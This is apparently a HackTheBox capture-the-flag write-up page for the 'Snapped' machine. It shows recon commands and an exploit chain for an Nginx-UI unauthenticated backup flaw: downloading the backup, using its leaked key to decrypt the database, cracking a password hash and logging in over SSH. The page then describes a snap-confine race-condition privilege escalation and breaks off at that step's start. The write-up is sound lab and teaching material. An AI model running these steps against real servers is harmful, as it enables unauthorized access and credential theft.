@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapped — HackTheBox Writeup | Oussama Zehri</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="icon" type="image/png" href="data:image/png;base64,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">
+    <style>
+        .hero { position:relative; padding:80px 40px 50px; border-bottom:1px solid var(--border); overflow:hidden; }
+        .hero-grid { position:absolute; inset:0; background-image:linear-gradient(rgba(57,255,20,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(57,255,20,0.03) 1px,transparent 1px); background-size:50px 50px; pointer-events:none; }
+        .hero-glow { position:absolute; width:500px; height:500px; border-radius:50%; background:radial-gradient(circle,rgba(255,0,60,0.07) 0%,transparent 70%); top:-200px; right:-100px; pointer-events:none; }
+        .hero-content { position:relative; z-index:2; max-width:860px; margin:0 auto; }
+        .status-line { font-size:0.72rem; color:var(--text-faint); letter-spacing:2px; text-transform:uppercase; display:flex; gap:20px; margin-bottom:20px; align-items:center; }
+        .status-dot { width:6px; height:6px; border-radius:50%; background:var(--green); animation:blink 1.5s step-end infinite; display:inline-block; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+        .machine-label { font-size:0.72rem; color:var(--red); letter-spacing:4px; text-transform:uppercase; margin-bottom:10px; display:flex; align-items:center; gap:10px; }
+        .machine-label::before { content:''; display:inline-block; width:30px; height:1px; background:var(--red); }
+        .hero-title { font-size:clamp(3rem,10vw,7rem); font-weight:700; color:#fff; letter-spacing:6px; text-transform:uppercase; line-height:1; margin-bottom:24px; }
+        .glitch { position:relative; display:inline-block; }
+        .glitch::before,.glitch::after { content:attr(data-text); position:absolute; top:0; left:0; font-size:inherit; font-weight:inherit; letter-spacing:inherit; }
+        .glitch::before { color:var(--red); animation:glitch1 4s infinite; clip-path:polygon(0 0,100% 0,100% 35%,0 35%); }
+        .glitch::after { color:var(--green); animation:glitch2 4s infinite; clip-path:polygon(0 65%,100% 65%,100% 100%,0 100%); }
+        @keyframes glitch1 { 0%,90%,100%{transform:translate(0);opacity:0} 92%{transform:translate(-3px,1px);opacity:0.8} 94%{transform:translate(3px,-1px);opacity:0.8} }
+        @keyframes glitch2 { 0%,88%,100%{transform:translate(0);opacity:0} 90%{transform:translate(3px,2px);opacity:0.8} 92%{transform:translate(-3px,-1px);opacity:0.8} }
+        .cve-strip { margin-top:24px; padding:14px 18px; background:rgba(255,0,60,0.05); border-left:3px solid var(--red); font-size:0.78rem; color:var(--red); display:flex; gap:30px; flex-wrap:wrap; }
+        .info-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:12px; margin:24px 0; }
+        .info-card { background:var(--bg-card); border:1px solid var(--border); border-left:3px solid var(--green); padding:18px 20px; }
+        .info-card.red { border-left-color:var(--red); }
+        .info-card-label { font-size:0.68rem; color:var(--text-faint); letter-spacing:2px; text-transform:uppercase; margin-bottom:6px; }
+        .info-card-value { font-size:0.85rem; color:var(--green); }
+        .info-card.red .info-card-value { color:var(--red); }
+        .vuln-box { background:rgba(255,0,60,0.04); border:1px solid rgba(255,0,60,0.15); padding:20px 24px; margin:20px 0; position:relative; }
+        .vuln-box::before { content:'⚠ CVE'; position:absolute; top:-10px; left:16px; background:var(--red); color:#000; font-size:0.68rem; padding:2px 10px; letter-spacing:2px; }
+        .vuln-box p { color:var(--text-dim); font-size:0.85rem; line-height:1.7; }
+        .vuln-box code { color:var(--green); background:var(--bg-card); padding:1px 5px; font-size:0.8rem; }
+        .steps { display:flex; flex-direction:column; }
+        .step { display:grid; grid-template-columns:60px 1fr; gap:0 20px; }
+        .step-num-col { display:flex; flex-direction:column; align-items:center; padding-top:2px; }
+        .step-circle { width:36px; height:36px; border:1px solid var(--red); display:flex; align-items:center; justify-content:center; font-size:0.75rem; color:var(--red); background:var(--bg); position:relative; z-index:1; flex-shrink:0; }
+        .step-line { width:1px; flex:1; background:var(--border); margin:4px 0; min-height:20px; }
+        .step-content { padding:0 0 40px 0; }
+        .step-title { font-size:0.85rem; color:#fff; margin-bottom:12px; display:flex; align-items:center; gap:10px; text-transform:uppercase; letter-spacing:1px; }
+        .step-tag { font-size:0.68rem; padding:2px 8px; background:rgba(57,255,20,0.08); color:var(--green); border:1px solid rgba(57,255,20,0.2); letter-spacing:1px; }
+        .step p { color:var(--text-dim); font-size:0.85rem; margin-bottom:12px; max-width:700px; }
+        .flag-box { background:rgba(57,255,20,0.04); border:1px solid rgba(57,255,20,0.2); padding:20px 24px; display:flex; align-items:center; gap:16px; margin:20px 0; }
+        .flag-icon { font-size:24px; flex-shrink:0; }
+        .flag-label { font-size:0.68rem; letter-spacing:2px; color:var(--green); margin-bottom:4px; }
+        .flag-value { font-size:0.8rem; color:var(--text-dim); }
+        .tech-table { width:100%; border-collapse:collapse; margin:20px 0; }
+        .tech-table th { text-align:left; padding:10px 16px; background:var(--bg-card); color:var(--red); font-size:0.72rem; letter-spacing:2px; border-bottom:1px solid var(--border); }
+        .tech-table td { padding:12px 16px; border-bottom:1px solid var(--border); font-size:0.82rem; }
+        .tech-table td:first-child { color:var(--green); white-space:nowrap; }
+        .tech-table td:last-child { color:var(--text-dim); }
+        .tech-table tr:hover td { background:var(--bg-card); }
+        @media(max-width:600px) { .hero { padding:80px 16px 40px; } .step { grid-template-columns:44px 1fr; } }
+    </style>
+</head>
+<body>
+
+<nav>
+    <a href="../../index.html">~/oussama</a>
+    <span class="sep">/</span>
+    <a href="../../writeups.html">writeups</a>
+    <span class="sep">/</span>
+    <a href="index.html">htb</a>
+    <span class="sep">/</span>
+    <span class="current">snapped</span>
+</nav>
+
+<div class="hero">
+    <div class="hero-grid"></div>
+    <div class="hero-glow"></div>
+    <div class="hero-content">
+        <div class="status-line">
+            <span class="status-dot"></span>
+            MACHINE PWNED &nbsp;·&nbsp; HTB // LINUX &nbsp;·&nbsp; 2026-04-01
+        </div>
+        <div class="machine-label">HackTheBox — Hard Difficulty</div>
+        <h1 class="hero-title"><span class="glitch" data-text="SNAPPED">SNAPPED</span></h1>
+        <div class="badge-row">
+            <span class="badge red">Hard</span>
+            <span class="badge">Linux</span>
+            <span class="badge">CVE-2026-27944</span>
+            <span class="badge">CVE-2026-3888</span>
+            <span class="badge">Nginx-UI</span>
+            <span class="badge">Snap PrivEsc</span>
+            <span class="badge green">Rooted ✅</span>
+        </div>
+        <div class="cve-strip">
+            <span>CVE-2026-27944 — Nginx-UI Unauthenticated Backup Exfiltration</span>
+            <span>CVE-2026-3888 — snap-confine TOCTOU Race Condition → Root</span>
+        </div>
+    </div>
+</div>
+
+<div class="toc" style="max-width:860px;margin:0 auto;">
+    <h2>// Table of Contents</h2>
+    <ol>
+        <li><a href="#recon">Reconnaissance</a></li>
+        <li><a href="#foothold">Foothold — CVE-2026-27944</a></li>
+        <li><a href="#privesc">Privilege Escalation — CVE-2026-3888</a></li>
+        <li><a href="#summary">Techniques Summary</a></li>
+    </ol>
+</div>
+
+<main class="wu-main">
+
+    <div class="section" id="recon">
+        <h2 class="section-title"><span class="icon">01</span> Reconnaissance</h2>
+        <div class="info-grid">
+            <div class="info-card"><div class="info-card-label">Target IP</div><div class="info-card-value">10.129.24.18</div></div>
+            <div class="info-card"><div class="info-card-label">Open Ports</div><div class="info-card-value">22, 80</div></div>
+            <div class="info-card red"><div class="info-card-label">OS</div><div class="info-card-value">Ubuntu 24.04 LTS</div></div>
+            <div class="info-card red"><div class="info-card-label">Web Server</div><div class="info-card-value">nginx 1.24.0</div></div>
+        </div>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Nmap Scan</span></div>
+            <pre><code>nmap -sCV 10.129.24.18
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+                     |_http-title: Did not follow redirect to http://snapped.htb/</code></pre>
+        </div>
+        <p style="color:var(--text-dim);font-size:0.85rem;margin:12px 0;">Added <code style="color:var(--green);background:var(--bg-card);padding:1px 5px;">snapped.htb</code> to <code style="color:var(--green);background:var(--bg-card);padding:1px 5px;">/etc/hosts</code>. VHost enumeration reveals an admin subdomain running Nginx-UI.</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>FFUF — VHost Enumeration</span></div>
+            <pre><code>ffuf -u http://10.129.24.18/ -H "Host: FUZZ.snapped.htb" \
+  -w subdomains-top1million-5000.txt -fs 154
+
+admin   [Status: 200, Size: 1407] → admin.snapped.htb</code></pre>
+        </div>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>FFUF — API Endpoints</span></div>
+            <pre><code>ffuf -u http://admin.snapped.htb/api/FUZZ -w common.txt
+
+backup      [Status: 200]  ← UNAUTHENTICATED!
+install     [Status: 200]
+settings    [Status: 403]
+users       [Status: 403]</code></pre>
+        </div>
+        <div class="callout green">💡 <code style="color:var(--green)">/api/backup</code> returns 200 with no authentication — immediate red flag.</div>
+    </div>
+
+    <div class="section" id="foothold">
+        <h2 class="section-title"><span class="icon">02</span> Foothold — CVE-2026-27944</h2>
+        <div class="vuln-box">
+            <p><strong style="color:var(--red)">CVE-2026-27944</strong> — Nginx-UI ≤ 2.3.2 exposes <code>/api/backup</code> without authentication. Returns a full AES-256-CBC encrypted backup and leaks the decryption key in the <code>X-Backup-Security</code> response header as <code>base64(key):base64(iv)</code>.</p>
+        </div>
+        <div class="steps">
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">01</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Download Backup & Extract Key <span class="step-tag">CURL</span></div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Key Leaks in Header</span></div>
+                        <pre><code>curl -OJ -v http://admin.snapped.htb/api/backup
+
+# Response header:
+X-Backup-Security: /NppkytwKqHvSXSUiNE4tiDQ5wYuD9AD5dGjWSN/30s=:3K4fZn4rxHqwtHUfY7UQcQ==
+
+key=$(echo '/NppkytwKqHvSXSUiNE4tiDQ5wYuD9AD5dGjWSN/30s=' | base64 -d | xxd -p -c 256)
+iv=$(echo '3K4fZn4rxHqwtHUfY7UQcQ==' | base64 -d | xxd -p)</code></pre>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">02</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Decrypt Backup & Extract Database <span class="step-tag">OPENSSL</span></div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Decrypt & Read DB</span></div>
+                        <pre><code>unzip backup.zip -d backup2 && cd backup2
+openssl enc -aes-256-cbc -d \
+  -in nginx-ui.zip -out nginxui_decrypted.zip \
+  -K $key -iv $iv
+unzip nginxui_decrypted.zip
+sqlite3 database.db "select * from users;"</code></pre>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">03</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Crack Hash & SSH Login <span class="step-tag">JOHN</span></div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Crack bcrypt</span></div>
+                        <pre><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+$2a$10$8M7JZSRLKdtJpx9YRUNTmO... : linkinpark
+
+ssh jonathan@snapped.htb  # password: linkinpark</code></pre>
+                    </div>
+                    <div class="flag-box">
+                        <div class="flag-icon">🚩</div>
+                        <div>
+                            <div class="flag-label">User Flag Captured</div>
+                            <div class="flag-value">jonathan@snapped:~$ cat user.txt</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="section" id="privesc">
+        <h2 class="section-title"><span class="icon">03</span> Privilege Escalation — CVE-2026-3888</h2>
+        <div class="vuln-box">
+            <p><strong style="color:var(--red)">CVE-2026-3888</strong> — <code>snap-confine</code> (SUID-root) creates bind-mounts of <code>/usr/lib/x86_64-linux-gnu</code> via <code>/tmp/.snap/</code>. Between bind-mount steps, an attacker swaps the directory atomically via <code>renameat2(RENAME_EXCHANGE)</code>, poisoning shared libraries in the namespace and enabling dynamic linker hijacking.</p>
+        </div>
+        <div class="info-grid">
+            <div class="info-card red"><div class="info-card-label">Snapd Version</div><div class="info-card-value">2.63.1+24.04</div></div>
+            <div class="info-card red"><div class="info-card-label">Fixed In</div><div class="info-card-value">2.74.2</div></div>
+            <div class="info-card"><div class="info-card-label">Cleanup Interval</div><div class="info-card-value">1 minute</div></div>
+            <div class="info-card"><div class="info-card-label">/tmp Age Limit</div><div class="info-card-value">4 minutes</div></div>
+        </div>
+        <div class="steps">
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">01</div><div class="step-line"></div></div>
+                <div class="step-content">
